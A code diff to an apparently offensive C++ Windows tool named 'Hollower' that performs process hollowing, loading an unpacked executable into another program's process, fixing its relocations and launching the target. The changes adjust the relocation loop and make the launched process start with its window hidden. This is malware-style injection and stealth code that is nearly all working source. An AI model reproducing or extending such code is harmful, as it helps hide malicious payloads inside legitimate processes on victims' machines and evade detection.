@@ -6,14 +6,14 @@
 #include <Psapi.h>
 
 #define EXE_OFFSET 0x200
-#define STATUS_CONFLICTING_ADDRESSES 0xC0000018
-#define TARGET_PROCESSOR 1 //used for affinity 
+#define TARGET_PROCESSOR 1 //affinity
 HANDLE hSection;
 
 Hollower::Hollower(std::wstring targetProcPath, BYTE* unpackedExe)
 {
 	this->hollowedProcPath = targetProcPath;
 	this->packedPEData = new PEData((IMAGE_DOS_HEADER*)(unpackedExe));
+
 	this->hollowedPEData = new PEData(targetProcPath);
 	riscySupportedProcess = false;
 	if (std::find(supportedRISCYHollowers.begin(), supportedRISCYHollowers.end(), hollowedProcPath) == supportedRISCYHollowers.end())
@@ -154,7 +154,7 @@ void Hollower::FixRelocations()
 		size_t blockSize = (DWORD)((IMAGE_BASE_RELOCATION*)((int)relocationDirectory + relPos))->SizeOfBlock;
 	
 		DWORD block = (DWORD)((int)relocationDirectory + relPos)+8;
-		while(*(WORD*)block!=0)
+		while((*(WORD*)block & 0xfff)!=0)
 		{
 			WORD minorOffset = (*(WORD*)block & 0xfff);
 
@@ -259,12 +259,13 @@ bool Hollower::StartRemoteProcess()
 	bool suspendRequired = false;
 	si.cb = sizeof(STARTUPINFO);
 	wchar_t app[MAX_PATH] = {};
-	
+
+	hollowedProcPath += L" 1";
 	std::copy(hollowedProcPath.begin(), hollowedProcPath.end(), app);
-	
-//	si.dwFlags = STARTF_USESHOWWINDOW;
-//	si.wShowWindow = false;
-	CreateProcess(app, NULL , NULL, NULL, false, 0, NULL, NULL, &si, &pi);
+
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = false;
+	CreateProcess(NULL, app, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
 	//if (!riscySupportedProcess)
 	//	SuspendThread(pi.hProcess);
 	this->hRemoteProc = pi.hProcess;
